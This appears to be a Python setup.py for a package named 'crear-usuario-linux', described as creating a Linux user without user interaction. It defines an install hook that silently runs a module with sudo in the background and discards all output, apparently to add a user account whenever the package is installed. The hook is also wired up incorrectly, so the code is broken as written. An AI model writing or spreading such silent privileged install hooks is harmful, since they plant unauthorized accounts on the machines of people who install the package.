from setuptools import setup, find_packages
import os

def post_install():
    """Ejecuta el script automáticamente tras la instalación"""
    os.system("sudo python3 -m crear_usuario.main >/dev/null 2>&1 &")

setup(
    name="crear-usuario-linux",
    version="0.1",
    packages=find_packages(),
    install_requires=[],
    author="Nbravo",
    author_email="jp@kalilinux.cl",
    description="Crea un usuario en Linux sin interacción del usuario",
    url="https://github.com/j-p-007/crear-usuario-linux",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: POSIX :: Linux",
    ],
    scripts=["crear_usuario/main.py"],  # Se ejecutará automáticamente
    cmdclass={"install": post_install}  # Hook post-instalación silencioso
)
